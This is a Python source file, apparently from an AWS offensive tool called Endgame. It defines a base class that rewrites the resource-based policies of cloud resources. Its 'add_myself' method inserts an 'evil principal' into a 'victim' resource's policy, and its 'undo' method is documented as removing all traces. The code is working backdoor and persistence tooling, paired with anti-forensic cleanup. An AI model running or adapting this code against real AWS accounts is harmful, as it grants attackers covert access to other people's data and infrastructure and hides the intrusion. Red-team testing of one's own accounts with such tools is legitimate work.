from abc import ABCMeta, abstractmethod
import json
import boto3
import copy
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.response_message import ResponseMessage
from endgame.shared.list_resources_response import ListResourcesResponse


class ResourceType(object):
    __meta_class__ = ABCMeta

    def __init__(
            self,
            name: str,
            resource_type: str,
            service: str,
            region: str,
            client: boto3.Session.client,
            current_account_id: str,
            override_action: str = None,
            include_resource_block: bool = True,
            override_resource_block: str = None,
            override_account_id_instead_of_principal: bool = False
    ):
        self.name = name
        self.resource_type = resource_type
        self.client = client
        self.current_account_id = current_account_id
        self.service = service
        self.region = region

        self.include_resource_block = include_resource_block  # Override for IAM
        self.override_action = override_action  # Override for IAM
        self.override_resource_block = override_resource_block  # Override for EFS
        self.override_account_id_instead_of_principal = override_account_id_instead_of_principal  # Override for logs, sns, sqs, and lambda

        self.policy_document = self._get_rbp()
        # Store an original copy of the policy so we can compare it later.
        self.original_policy = copy.deepcopy(json.loads(json.dumps(self.policy_document.original_policy)))

    def __str__(self):
        return '%s' % (json.dumps(json.loads(self.policy_document.__str__())))

    @abstractmethod
    def _get_rbp(self) -> PolicyDocument:
        raise NotImplementedError("Must override _get_rbp")

    @property
    @abstractmethod
    def arn(self) -> str:
        raise NotImplementedError("Must override arn")

    @abstractmethod
    def set_rbp(self, evil_policy: dict) -> dict:
        raise NotImplementedError("Must override set_rbp")

    # def add_myself(self, evil_principal: str, dry_run: bool = False) -> dict:
    def add_myself(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Add your rogue principal to the AWS resource"""
        evil_policy = self.policy_document.policy_plus_evil_principal(
            victim_account_id=self.current_account_id,
            evil_principal=evil_principal,
            resource_arn=self.arn
        )
        if not dry_run:
            new_policy = self.set_rbp(evil_policy=evil_policy)
            operation = "ADD_MYSELF"
            message = ""
        else:
            new_policy = evil_policy
            operation = "DRY_RUN_ADD_MYSELF"
            message = ""
        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=new_policy, resource_type=self.resource_type, resource_name=self.name)
        return response_message

    # def undo(self, evil_principal: str, dry_run: bool = False) -> dict:
    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Remove all traces"""
        policy_stripped = self.policy_document.policy_minus_evil_principal(
            victim_account_id=self.current_account_id,
            evil_principal=evil_principal,
            resource_arn=self.arn
        )
        if not dry_run:
            operation = "UNDO"
            new_policy = self.set_rbp(evil_policy=policy_stripped)
        else:
            operation = "DRY_RUN_UNDO"
            new_policy = policy_stripped

        response_message = ResponseMessage(message="", operation=operation, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=new_policy, resource_type=self.resource_type, resource_name=self.name)
        return response_message


class ResourceTypes(object):
    __meta_class__ = ABCMeta

    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        self.client = client
        self.current_account_id = current_account_id
        self.region = region

    def __str__(self):
        return '%s' % (json.dumps(self.resources.arn))

    @property
    @abstractmethod
    def resources(self) -> list[ListResourcesResponse]:
        raise NotImplementedError("Must override property 'resources'")
